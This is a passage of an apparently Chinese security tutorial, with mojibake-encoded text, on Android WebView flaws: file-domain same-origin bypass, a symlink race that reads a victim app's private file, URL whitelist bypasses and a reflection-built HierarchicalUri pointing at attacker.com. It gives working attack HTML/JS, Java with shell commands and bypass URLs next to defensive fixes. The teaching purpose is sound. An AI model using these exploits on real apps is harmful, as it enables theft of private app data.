class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å¯setAllowUniversalAccessFromFileURLs å‡½æ•°API,å¹¶è¿è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ File åè®®</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">   webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œæˆ‘ä»¬æ³¨å…¥htmlåè¿˜å¯ä»¥å»è®¿é—®ç½‘ç«™ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿å…¶è®¿é—®æ¶æ„çš„ç½‘ç«™ç•Œé¢ï¼Œå¹¶è¿”å›è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ¶æ„ç•Œé¢çš„æ³¨å…¥</p><h5 id="å®‰å…¨é˜²æŠ¤-2"><strong>å®‰å…¨é˜²æŠ¤</strong></h5><ul><li>æ£€æŸ¥åº”ç”¨æ˜¯å¦ä½¿ç”¨äº†webviewæ§ä»¶</li><li>é¿å…appå†…éƒ¨çš„webviewè¢«ä¸ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹è°ƒç”¨ï¼Œæ’æŸ¥å†…ç½®webviewçš„activityæ˜¯å¦è¢«å¯¼å‡ºï¼Œå¿…é¡»å¯¼å‡ºçš„activityæ˜¯å¦ä¼šé€šè¿‡å‚æ•°ä¼ é€’è°ƒèµ·å†…ç½®çš„webview</li><li>fileåŸŸè®¿é—®ä¸ºéå¿…è¦åŠŸèƒ½éœ€æ±‚æ—¶ï¼Œæ‰‹åŠ¨é…ç½® setAllowFileAccessFromFileURLs æˆ– setAllowUniversalAccessFromFileURLs ä¸¤ä¸ª API ä¸º falseï¼ˆAndroid 4.1 ç‰ˆæœ¬ä¹‹å‰è¿™ä¸¤ä¸ª API é»˜è®¤æ˜¯ trueï¼Œéœ€è¦æ˜¾å¼è®¾ç½®ä¸º falseï¼‰ï¼›</li></ul><p>è‹¥è¦å¼€å¯fileåŸŸè®¿é—®ï¼Œåˆ™è®¾ç½®fileè·¯å¾„çš„ç™½åå•ï¼Œä¸¥æ ¼æ§åˆ¶fileåŸŸè®¿é—®èŒƒå›´ï¼Œå…·ä½“å¦‚ä¸‹</p><ul><li>å›ºå®šä¸å˜çš„ HTML æ–‡ä»¶å¯ä»¥æ”¾åœ¨ assets æˆ– res ç›®å½•ä¸‹ï¼Œfile:///android_asset å’Œ file:///android_res åœ¨ä¸å¼€å¯ API çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥è®¿é—®ï¼›</li><li>å¯èƒ½ä¼šæ›´æ–°çš„ HTML æ–‡ä»¶æ”¾åœ¨ /data/data/(app) ç›®å½•ä¸‹ï¼Œé¿å…è¢«ç¬¬ä¸‰æ–¹æ›¿æ¢æˆ–ä¿®æ”¹ï¼›</li><li>å¯¹ file åŸŸè¯·æ±‚åšç™½åå•é™åˆ¶æ—¶ï¼Œéœ€è¦å¯¹â€œâ€¦/â€¦/â€ç‰¹æ®Šæƒ…å†µè¿›è¡Œå¤„ç†ï¼Œé¿å…ç™½åå•è¢«ç»•è¿‡ã€‚</li></ul><h5 id="ç¬¦å·é“¾æ¥è·¨æºæ”»å‡»">ç¬¦å·é“¾æ¥è·¨æºæ”»å‡»</h5><p><a href="https://blog.csdn.net/qq_35993502/article/details/121371049">Androidå®‰å…¨æ£€æµ‹ï¼WebView FileåŸŸåŒæºç­–ç•¥ç»•è¿‡æ¼æ´</a></p><p>è¿™ç±»æ¼æ´ï¼Œåªæœ‰<strong>setAllowFileAccessä¸ºTrue</strong></p><p><strong>æ¼æ´åŸç†</strong></p><p><img src="/posts/f416437f.htm/905443_NW7GHWBMGDNE5TU.png" alt="image-20220729202532795"></p><p>æ”»å‡»è¿‡ç¨‹ï¼šé¦–å…ˆæ˜¯æ“æ§webviewå»è®¿é—®æ”»å‡»appè‡ªå·±å…¬å¼€çš„ä¸€ä¸ªç½‘é¡µï¼Œç„¶åè¿™ä¸ªç½‘é¡µæ‰§è¡Œçš„å†…å®¹å…¶å®æ˜¯å»¶æ—¶å»è¯»å–è‡ªèº«ï¼Œåœ¨å»¶æ—¶è¯»å–è‡ªèº«çš„æ—¶é—´çª—å£å†…ï¼Œè¿™ä¸ªæ–‡ä»¶æ‚„æ‚„è¢«è¿›è¡Œäº†æ›¿æ¢ï¼Œæ›¿æ¢æˆäº†è½¯è¿æ¥ï¼ŒæŒ‡å‘å—å®³è€…appçš„ä¸€ä¸ªç§æœ‰æ–‡ä»¶ï¼Œæœ€ç»ˆè¯»å–çªƒå–å†…å®¹</p><p>æ„é€ HTMLæ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#æ¶æ„APPçš„HTML,è¢«æ£€æµ‹APPåŠ è½½æ­¤htmlï¼Œæ‰§è¡ŒJSä»£ç </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var d = document;</span><br><span class="line">function loadDatabase()</span><br><span class="line">&#123;</span><br><span class="line">    var file_url = d.URL;</span><br><span class="line">    var xmlhttp =new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onload=function() &#123;    //å›è°ƒå‡½æ•° å½“è¯·æ±‚å®Œæˆæ—¶æ‰§è¡Œ</span><br><span class="line">         document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span><br><span class="line">        alert(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,file_url);</span><br><span class="line">    xmlhttp.send(null);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(loadDatabase(),8000); #å»¶è¿Ÿ8ç§’æ‰§è¡Œã€‚åˆ©ç”¨æ—¶é—´å·®å’Œè½¯é“¾æ¥æ¥è·å–è¢«æ”»å‡»APPçš„ç§æœ‰æ–‡ä»¶</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ æ¶æ„appçš„æ”»å‡»ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#æ¶æ„APPçš„æ”»å‡»ä»£ç </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;æ¶æ„APPçš„HTML,åœ¨ä¸Šé¢çš„HTMLä»£ç &quot;</span>;</span><br><span class="line">          #æ–°å»ºæ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾æ¶æ„HTMLæ–‡ä»¶</span><br><span class="line">           cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">           #å°†æ¶æ„HTMLåˆ°æ¶æ„APPçš„æ²™ç›’ç›®å½•</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #æˆæƒç›®å½•åŠå…¶æ–‡ä»¶æƒé™ï¼Œå…è®¸å…¶å®ƒåº”ç”¨è®¿é—®</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #å¯åŠ¨è¢«æ”»å‡»çš„APPï¼Œå¹¶æºå¸¦æ¶æ„HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #å»¶æ—¶<span class="number">6</span>ç§’</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #åˆ é™¤HTMLæ–‡ä»¶</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #è½¯é“¾æ¥æ–‡ä»¶ï¼Œå®ç°è¯»å–è¢«æ”»å‡»åº”ç”¨çš„<span class="keyword">private</span>.txtæ–‡ä»¶</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æ ·æœ¬ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#è¢«æ”»å‡»çš„APPï¼Œæœ‰æ¼æ´çš„ä»£ç </span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  å…è®¸åŠ è½½FileåŸŸ</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #å–å‡ºäº†æ¶æ„HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #åŠ è½½äº†æ¶æ„HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="å®‰å…¨é˜²æŠ¤-3">å®‰å…¨é˜²æŠ¤</h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1ã€è®¾ç½®<span class="keyword">set</span>AllowFileAccessæ–¹æ³•ä¸º<span class="literal">false</span>,è®¾ç½®<span class="keyword">set</span>AllowFileAccessFromFileURLså’Œ </span><br><span class="line">    <span class="keyword">set</span>AllowUniversalAccessFromFileURLsä¸º<span class="literal">false</span>ã€‚</span><br><span class="line">2ã€åœ¨Android4.0<span class="params">(API15)</span>åŠä»¥ä¸‹å¾—é‡‡ç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œæ‰‹åŠ¨æ ¡éªŒæ˜¯å¦è®¿é—®fileåŸŸ</span><br><span class="line">3ã€å½“WebViewæ‰€åœ¨Activityå­˜åœ¨ç»„ä»¶æš´éœ²æ—¶ï¼Œè‹¥ä¸æ˜¯å¿…è¦çš„ç»„ä»¶æš´éœ²ï¼Œåº”è¯¥ç¦æ­¢ç»„ä»¶æš´éœ²</span><br></pre></td></tr></table></figure><h5 id="æ±¡æŸ“cookie">æ±¡æŸ“cookie</h5><p><a href="http://www.ctfiot.com/39656.html">Android-Webviewä¸­çš„æ¼æ´åˆ©ç”¨æ€»ç»“</a></p><h4 id="URLé…ç½®æ¼æ´">URLé…ç½®æ¼æ´</h4><p><a href="https://www.freebuf.com/vuls/201407.html">ä¸€æ–‡å½»åº•ææ‡‚å®‰å“WebViewç™½åå•æ ¡éªŒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>è®¸å¤šURLå¯ä»¥é€šè¿‡å„ç§æ–¹å¼å»ç»•è¿‡éªŒè¯ï¼Œä»è€Œå¼•èµ·å„å¼å„æ ·çš„æ¼æ´getUserInfo</p><p>URLçš„æ„é€ ï¼š</p><p><code>scheme://login:password@address:port/path/to/resource/?query_string#fragment</code></p><ul><li>scheme<br>ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒ…æ‹¬httpã€httpsã€fileã€ftpç­‰ç­‰,:ä¹‹åçš„â€œ//â€å¯çœç•¥ï¼Œä¾‹å¦‚http:www.qq.com, æ­¤å¤–ï¼Œå¤šæ•°æµè§ˆå™¨åœ¨schemeä¹‹å‰<strong>åŠ ç©ºæ ¼</strong>ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸è§£æçš„</li><li>login:password@ï¼ˆè®¤è¯ä¿¡æ¯ï¼‰<br>æœåŠ¡å™¨æœ‰æ—¶å€™éœ€è¦ç”¨æˆ·åå’Œå¯†ç è®¤è¯ï¼Œftpåè®®æ¯”è¾ƒå¸¸è§ï¼Œhttpå¾ˆå°‘è§ï¼Œä½†è¿™ä¸ª<strong>ä¸å¸¸è§å­—æ®µå¾€å¾€å¯ä»¥ç»•è¿‡</strong>å¾ˆå¤šæ£€æŸ¥</li><li>address<br>addresså­—æ®µå¯ä»¥æ˜¯ä¸€ä¸ª<strong>ä¸åŒºåˆ†å¤§å°å†™</strong>çš„åŸŸåã€ä¸€ä¸ªipv4åœ°å€æˆ–å¸¦æ–¹æ‹¬å·çš„ipv6åœ°å€ï¼Œéƒ¨åˆ†æµè§ˆå™¨æ¥æ”¶ipåœ°å€çš„å…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶ç­‰å†™æ³•</li><li>port<br>ç«¯å£å·</li><li>/path/to/resource<br>å±‚çº§è·¯å¾„ï¼Œå¯ä»¥ä½¿ç”¨â€œâ€¦/â€åˆ°ä¸Šä¸€çº§ç›®å½•</li><li>query_string<br>æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæ ¼å¼ä¸ºâ€query_string?name1=value1&amp;name2=value2â€</li><li>fragment<br>ç”¨äºhtmlä¸­çš„é¡µé¢å®šä½</li></ul><h5 id="URLç»•è¿‡æ¼æ´">URLç»•è¿‡æ¼æ´</h5><p><a href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URLæ£€æŸ¥ç»•è¿‡ | m4bln (mabin004.github.io)</a></p><p>çœ‹ä¸€ä¸ªç®€å•çš„urlæ ¡éªŒä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">    enableJavaScriptInterface();</span><br><span class="line">    <span class="comment">//æˆ–è€…webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨checkDomainå¯¹åŸŸåè¿›è¡Œæ ¡éªŒ</p><p>å®é™…ä¸­ä¼šå‘ç°è¿™æ ·çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œæ˜¯ä¸ºäº†é˜²æ­¢åŠ è½½fileçš„åŒæºç­–ç•¥è¿›è¡Œçš„é˜²æŠ¤ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰å¾ˆå¤šç»•è¿‡çš„æ–¹æ³•</p><p><strong>æ€»ç»“</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.å¤§å†™å­—æ¯ <span class="keyword">File</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">2</span>.å‰é¢åŠ ä¸Šç©ºæ ¼ï¼š <span class="keyword">file</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">3</span>.å­—ç¬¦ç¼–ç ï¼šâ€œ<span class="keyword">file</span>ï¼š%<span class="number">2</span>F/â€</span><br><span class="line"><span class="number">4</span>.å¯æ­£å¸¸è®¿é—®çš„ç•¸å½¢è·¯å¾„ï¼š<span class="keyword">file</span>:sdcard<span class="regexp">/attack/</span>htmlâ€ æˆ– â€œ<span class="keyword">file</span>:<span class="regexp">/\//</span>sdcard/attack.html</span><br></pre></td></tr></table></figure><p><strong>å¸¸è§çš„urlæ£€éªŒ</strong></p><p>urlä¸­ä¼šå¯¹é¦–å°¾è¿›è¡Œæ ¡éªŒ</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span>(host.endsWith(&quot;mysite.com&quot;))&#123;</span><br><span class="line">    <span class="built_in">enableJavascriptInterface</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨é—®é¢˜ï¼šendsWithæœªé—­åˆç‚¹å·</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç»•è¿‡ï¼ševilmysite<span class="selector-class">.com</span>  <span class="comment">//æ¶æ„åŸŸå</span></span><br><span class="line">ä¿®å¤ï¼š<span class="built_in">endsWith</span>(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨startsWithï¼Œcontainsï¼ŒindexOfï¼Œæ­£åˆ™åŒ¹é…ç­‰éä¸¥æ ¼å­—ç¬¦ä¸²åŒ¹é…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">    enableJavascriptInterface();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ç»•è¿‡ï¼šmysite.com<span class="meta">@oppo</span>.com</span><br></pre></td></tr></table></figure><p>contains +indexOfç»•è¿‡ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä»»ä½•å¯ä»¥æ·»åŠ å­—ç¬¦ä¸²çš„å­—æ®µ</span><br><span class="line">å­åŸŸå huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">å­è·¯å¾„ mysite.<span class="keyword">com</span>/huawei.<span class="keyword">com</span></span><br><span class="line">å‚æ•° mysite.<span class="keyword">com</span>/xxxx#huawei.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><p><strong>//å’Œç¬¬ä¸€ä¸ª/ä¹‹é—´æå–host</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span class="string">&quot;/&quot;</span>)); <span class="comment">//æå–host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹å¼ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å­åŸŸå huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">http://huawei.com@www.rebeyond.net/poc.htm</span><br><span class="line">http://<span class="variable">a:a</span>@www.huawei.<span class="keyword">com</span>:b@www.baidu.<span class="keyword">com</span> åœ¨androidä¸­ä½¿ç”¨getHostè·å–åˆ°çš„æ˜¯huawei.<span class="keyword">com</span>,ä½†å®é™…è®¿é—®çš„æ˜¯baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.VIEW</span> -d URIçš„å€¼  å¯åŠ¨è¿™ä¸ªurl</span><br></pre></td></tr></table></figure><h5 id="hearachical-Uriç»•è¿‡">hearachical Uriç»•è¿‡</h5><p>å‡è®¾æˆ‘ä»¬åŠ è½½çš„uriä¸æ˜¯é€šè¿‡Uri.parseï¼Œè€Œæ˜¯é€šè¿‡å¤–éƒ¨ç›´æ¥è·å–ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ hearachical æ¥ç»•è¿‡</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ HierarchicalUri å’Œ Java Reflection API è¿›è¡Œæ”»å‡»ï¼ŒåŒæ ·æˆ‘ä»¬åˆ†æä¸€ä¸ªæ ·æœ¬çš„URLéªŒè¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">   webView.loadUrl(uri.toString(), getAuthHeaders()); <span class="comment">//getAuthHeaders()è¯·æ±‚å¤´ä¿¡æ¯</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>android.net.Uriåœ¨Androidè¢«å¹¿æ³›ä½¿ç”¨ï¼Œä½†å®é™…ä¸Šä»–æ˜¯ä¸€ä¸ªæŠ½è±¡ç±» android.net.Uri$HierarchicalUriæ˜¯å®ƒçš„å­ç±»ä¹‹ä¸€ã€‚Java åå°„ API ä½¿åˆ›å»ºèƒ½å¤Ÿç»•è¿‡æ­¤æ£€æŸ¥çš„ Uri æˆä¸ºå¯èƒ½ã€‚</p><p>é€šè¿‡åå°„ä¼ â¼Šâ¼€ä¸ªschemeã€authoritiyå’Œpathï¼Œæ„é€ â¼€ä¸ªå½¢å¼ä¸º<code>https://legitimate.com@attacker.com</code>çš„HierachicalUriå®ä¾‹å³å¯ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//javaåå°„è·å–ç±»å¼•ç”¨</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> 